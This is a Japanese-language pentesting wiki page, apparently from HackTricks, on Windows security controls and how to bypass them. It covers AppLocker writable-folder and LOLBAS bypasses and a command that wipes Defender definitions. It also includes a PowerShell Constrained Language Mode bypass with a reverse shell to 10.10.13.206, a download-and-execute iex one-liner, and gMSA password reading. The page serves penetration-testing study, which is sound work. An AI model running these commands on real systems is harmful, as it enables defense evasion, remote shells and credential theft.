# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

application whitelist は、システム上に存在し実行することが許可された承認済みの software applications または executables のリストです。その目的は、組織固有の business needs に適合しない有害な malware や未承認の software から環境を保護することです。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) は Microsoft の **application whitelisting solution** であり、system administrators が **users が実行できる applications and files** を制御できるようにします。executables、scripts、Windows installer files、DLLs、packaged apps、packed app installers を対象に、**granular control** を提供します。\
組織が **cmd.exe と PowerShell.exe** および特定の directories への write access を **block** することは一般的です、**しかし、これらはすべて bypass できます**。

### Check

blacklist/whitelist されている files/extensions を確認します:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
このレジストリ パスには、AppLocker によって適用される構成とポリシーが含まれており、システム上で現在強制されているルールセットを確認できます。

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy を bypass するために有用な **Writable folders**: AppLocker が `C:\Windows\System32` または `C:\Windows` 内のあらゆるものの実行を許可している場合、これを **bypass** するために使用できる **writable folders** があります。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 一般的に**信頼されている**[**「LOLBAS」](https://lolbas-project.github.io/)バイナリも、AppLockerのバイパスに利用できます。
- **不適切に記述されたルールもバイパスできる可能性があります**
- 例えば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**の場合、どこにでも**`allowed`という名前のフォルダー**を作成でき、そのフォルダーは許可されます。
- 組織では、**`%System32%\WindowsPowerShell\v1.0\powershell.exe`実行ファイルのブロック**に注力することがよくありますが、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`や`PowerShell_ISE.exe`など、その他の[**PowerShell実行ファイルの場所**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)を見落としています。
- **DLL enforcementが有効化されていることは非常にまれです**。これは、システムに追加の負荷がかかる可能性があり、何も壊れないことを確認するために大量のテストが必要になるためです。そのため、**DLLをバックドアとして使用すると、AppLockerのバイパスに役立ちます**。
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)または[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用して、任意のプロセス内で**Powershell**コードを実行し、AppLockerをバイパスできます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)を確認してください。<sup>[[1]](#references)</sup>

## 認証情報の保存

### Security Accounts Manager (SAM)

ローカルの認証情報はこのファイルに存在し、パスワードはハッシュ化されています。

### Local Security Authority (LSA) - LSASS

Single Sign-Onのため、**認証情報**（ハッシュ化済み）はこのサブシステムの**メモリ**に**保存**されます。\
**LSA**は、ローカルの**セキュリティポリシー**（パスワードポリシー、ユーザー権限など）、**認証**、**アクセストークン**などを管理します。\
ローカルログインの場合、LSAが**SAM**ファイル内の提供された認証情報を**確認**し、ドメインユーザーを認証するために**ドメインコントローラー**と**通信**します。

**認証情報**は**LSASSプロセス**内に**保存**されます。Kerberosチケット、NTおよびLMハッシュ、簡単に復号できるパスワードなどです。

### LSA secrets

LSAは一部の認証情報をディスクに保存することがあります。

- Active Directoryのコンピューターアカウントのパスワード（ドメインコントローラーに到達できない場合）。
- Windowsサービスのアカウントのパスワード
- スケジュールされたタスクのパスワード
- その他（IISアプリケーションのパスワードなど）

### NTDS.dit

これはActive Directoryのデータベースです。Domain Controllersにのみ存在します。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)は、Windows 10、Windows 11、およびWindows Serverの各バージョンで利用できるAntivirusです。**`WinPEAS`**などの一般的なpentestingツールを**ブロック**します。ただし、これらの**保護をバイパスする方法**があります。

### 確認

**Defender**の**状態**を確認するには、PS cmdletの**`Get-MpComputerStatus`**を実行します（有効かどうかを確認するには**`RealTimeProtectionEnabled`**の値を確認します）。

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

列挙するには、次のコマンドも実行できます。
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFSは、**File Encryption Key (FEK)** と呼ばれる**symmetric key**を使用して、暗号化によってファイルを保護します。このキーはユーザーの**public key**で暗号化され、暗号化されたファイルの$EFS **alternative data stream**内に保存されます。復号が必要になると、ユーザーのデジタル証明書に対応する**private key**を使用して、$EFS streamからFEKを復号します。詳細については[こちら](https://en.wikipedia.org/wiki/Encrypting_File_System)を参照してください。

**ユーザーの操作なしで復号されるシナリオ**には、以下があります。

- ファイルまたはフォルダーが[ FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)のようなEFS以外のファイルシステムに移動されると、自動的に復号されます。
- SMB/CIFS protocol経由でネットワーク上に送信される暗号化ファイルは、送信前に復号されます。

この暗号化方式により、所有者は暗号化されたファイルに**transparent access**できます。ただし、所有者のパスワードを単に変更してログインするだけでは、復号できません。

**Key Takeaways**:

- EFSは、ユーザーのpublic keyで暗号化されたsymmetric FEKを使用します。
- 復号では、ユーザーのprivate keyを使用してFEKにアクセスします。
- FAT32へのコピーやネットワーク transmissionなど、特定の条件下では自動的に復号されます。
- 暗号化されたファイルには、所有者が追加の操作なしでアクセスできます。

### EFS infoの確認

**user**がこの**service**を**使用した**かどうかは、次のパスが存在するか確認します:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file>\ を使用して、ファイルに**access**できる**who**を確認します。  
フォルダー内で `cipher /e` と `cipher /d` を使用して、すべてのファイルを**encrypt**および**decrypt**することもできます。

### EFS filesの復号

#### Being Authority System

この方法では、ホスト内で**victim user**が**process**を**running**している必要があります。その場合、`meterpreter` sessionsを使用して、ユーザーのprocessのtokenをimpersonateできます（`incognito`の`impersonate_token`）。または、ユーザーのprocessへ`migrate`することもできます。

#### Knowing the users password

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoftは、IT infrastructureにおけるservice accountsの管理を簡略化するために、**Group Managed Service Accounts (gMSA)**を開発しました。従来のservice accountsでは、**"Password never expire"**設定が有効になっていることが多いのに対し、gMSAはより安全で管理しやすいソリューションを提供します。

- **Automatic Password Management**: gMSAは、domainまたはcomputer policyに従って自動的に変更される、240文字の複雑なpasswordを使用します。この処理はMicrosoftのKey Distribution Service (KDC)によって実行されるため、手動でpasswordを更新する必要がありません。
- **Enhanced Security**: これらのaccountsはlockoutの影響を受けず、interactive loginsにも使用できないため、securityが向上します。
- **Multiple Host Support**: gMSAは複数のhostsで共有できるため、複数のservers上で実行されるservicesに適しています。
- **Scheduled Task Capability**: managed service accountsとは異なり、gMSAはscheduled tasksの実行をサポートします。
- **Simplified SPN Management**: computerのsAMaccount detailsまたはDNS nameに変更があると、systemがService Principal Name (SPN)を自動的に更新するため、SPN managementが簡略化されます。

gMSAのpasswordはLDAP property _**msDS-ManagedPassword**_ に保存され、Domain Controllers (DCs)によって30日ごとに自動的にresetされます。このpasswordは[MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)として知られる暗号化されたdata blobであり、authorized administratorsと、gMSAがインストールされているserversのみが取得できます。これによりsecureなenvironmentが確保されます。この情報にアクセスするには、LDAPSなどのsecured connectionが必要であるか、connectionが'Sealing & Secure'でauthenticatedされている必要があります。

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)でこのpasswordを読み取ることができます**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**この投稿で詳細を確認**](https://cube0x0.github.io/Relaying-for-gMSA/)

また、**gMSA** の **password** を **read** するために **NTLM relay attack** を実行する方法については、この[web page](https://cube0x0.github.io/Relaying-for-gMSA/)も確認してください。<sup>[[3]](#references)</sup>

## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) からダウンロードできる **Local Administrator Password Solution (LAPS)** は、ローカル Administrator の password を管理できるようにします。これらの **randomized** された一意の password は、**regularly changed** され、Active Directory に一元的に保存されます。これらの password へのアクセスは、認証されたユーザーに限定されるよう ACLs によって制限されています。十分な permissions が付与されている場合、ローカル admin password を read できるようになります。

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell の [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) は、PowerShell を効果的に使用するために必要な多くの機能を **ロックダウン** します。これには、COM オブジェクトのブロック、承認された .NET types のみの許可、XAML ベースの workflows、PowerShell classes などが含まれます。

### **確認**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
現在の Windows ではその Bypass は動作しませんが、[**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) を使用できます。\
**コンパイルするには** **次の操作が必要な場合があります** _**Add a Reference**_ -> _Browse_ -> _Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` を追加し、**プロジェクトを .Net4.5 に変更**します。

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用すると、任意のプロセスで **PowerShell** コードを実行し、制約モードをバイパスできます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode) を参照してください。<sup>[[1]](#references)</sup>

## PS 実行ポリシー

デフォルトでは **restricted** に設定されています。このポリシーをバイパスする主な方法は次のとおりです。<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
詳細は[こちら](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy)をご覧ください。

## Security Support Provider Interface (SSPI)

ユーザーの認証に使用できるAPIです。

SSPIは、通信を行おうとする2台のマシンに適したプロトコルを見つける役割を担います。これにはKerberosが推奨されます。その後、SSPIは使用する認証プロトコルをネゴシエートします。これらの認証プロトコルはSecurity Support Provider (SSP)と呼ばれ、各Windowsマシン内にDLLとして配置されています。通信を行うには、両方のマシンが同じSSPをサポートしている必要があります。

### Main SSPs

- **Kerberos**: 推奨されるもの
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1**および**NTLMv2**: 互換性のため
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: WebサーバーおよびLDAPで使用され、パスワードはMD5 hashの形式
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSLおよびTLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 使用するプロトコル（KerberosまたはNTLM）をネゴシエートするために使用される（デフォルトはKerberos）
- %windir%\Windows\System32\lsasrv.dll

#### ネゴシエーションでは、複数の方式または1つの方式だけが提示される場合があります。

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)は、**権限昇格を伴う操作に対する同意プロンプト**を有効にする機能です。

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [ApplockerおよびPowerShellのconstrained language modeのBypassing](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [howto ~ EFS filesのdecrypt](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSAのRelaying](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [PowerShell Execution PolicyをBypassする15の方法](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
